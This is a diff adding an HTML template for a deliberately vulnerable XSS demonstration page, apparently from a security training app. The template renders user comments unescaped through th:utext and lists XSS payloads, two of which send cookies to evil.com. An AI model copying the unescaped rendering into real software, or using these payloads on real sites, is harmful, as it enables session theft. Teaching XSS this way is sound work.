@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <title>Comments - XSS Demo</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            color: #fff;
+            padding: 40px;
+        }
+        .container { max-width: 1000px; margin: 0 auto; }
+        h1 { color: #ff6b6b; margin-bottom: 30px; }
+        .comment-form {
+            background: rgba(255,255,255,0.05);
+            padding: 30px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+        }
+        input, textarea {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(0,0,0,0.3);
+            color: #fff;
+            font-size: 1em;
+            margin-bottom: 15px;
+        }
+        textarea { height: 100px; resize: vertical; }
+        button {
+            padding: 15px 30px;
+            background: linear-gradient(90deg, #ff4444, #ff8800);
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .comments-list {
+            background: rgba(0,0,0,0.3);
+            padding: 20px;
+            border-radius: 15px;
+        }
+        .comment {
+            background: rgba(255,255,255,0.05);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            border-left: 4px solid #00ccff;
+        }
+        .comment-author { color: #00ccff; font-weight: bold; }
+        .comment-time { color: #666; font-size: 0.9em; }
+        .comment-content { margin-top: 10px; }
+        .attack-examples {
+            background: rgba(255,68,68,0.1);
+            border: 1px solid #ff4444;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 30px;
+        }
+        .attack-examples h3 { color: #ff4444; margin-bottom: 15px; }
+        .attack-examples code {
+            display: block;
+            background: #0d1117;
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 5px;
+            color: #00ff88;
+            word-break: break-all;
+        }
+        .back-link {
+            display: inline-block;
+            margin-bottom: 20px;
+            color: #00ccff;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="/" class="back-link">← Back to Home</a>
+        <h1>📜 XSS Demo - Comments</h1>
+
+        <div class="comment-form">
+            <h3>Add a Comment</h3>
+            <input type="text" id="authorInput" placeholder="Your name">
+            <textarea id="commentInput" placeholder="Your comment..."></textarea>
+            <button onclick="addComment()">Post Comment</button>
+        </div>
+
+        <div class="comments-list">
+            <h3>Comments</h3>
+            <div id="commentsContainer">
+                <div th:each="comment : ${comments}" class="comment">
+                    <div class="comment-author" th:text="${comment.author}">Author</div>
+                    <div class="comment-time" th:text="${comment.timestamp}">Time</div>
+                    <!-- VULNERABLE: th:utext renders HTML without escaping -->
+                    <div class="comment-content" th:utext="${comment.content}">Content</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="attack-examples">
+            <h3>⚠️ Try These XSS Attacks:</h3>
+            <p style="color: #aaa; margin-bottom: 15px;">These payloads will execute in the browser:</p>
+
+            <p><strong>1. Basic alert:</strong></p>
+            <code>&lt;script&gt;alert('XSS!')&lt;/script&gt;</code>
+
+            <p><strong>2. Cookie stealing:</strong></p>
+            <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>
+
+            <p><strong>3. DOM manipulation:</strong></p>
+            <code>&lt;img src=x onerror="alert('XSS via img tag')"&gt;</code>
+
+            <p><strong>4. Keylogger simulation:</strong></p>
+            <code>&lt;script&gt;document.onkeypress=function(e){console.log(e.key)}&lt;/script&gt;</code>
+
+            <p><strong>5. Redirect attack:</strong></p>
+            <code>&lt;script&gt;window.location='https://evil.com?cookie='+document.cookie&lt;/script&gt;</code>
+
+            <p><strong>6. Image tag attack:</strong></p>
+            <code>&lt;img src="x" onerror="this.src='https://evil.com/steal?c='+document.cookie"&gt;</code>
+        </div>
+    </div>
+
+    <script>
+        async function addComment() {
+            const author = document.getElementById('authorInput').value;
+            const comment = document.getElementById('commentInput').value;
+
+            if (!author || !comment) {
+                alert('Please fill in both fields');
+                return;
+            }
+
+            try {
+                const response = await fetch(`/api/comments?author=${encodeURIComponent(author)}&comment=${encodeURIComponent(comment)}`, {
+                    method: 'POST'
+                });
+
+                if (response.ok) {
+                    // Reload to show new comment (which will render XSS if present)
+                    window.location.reload();
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+    </script>
+</body>
+</html>
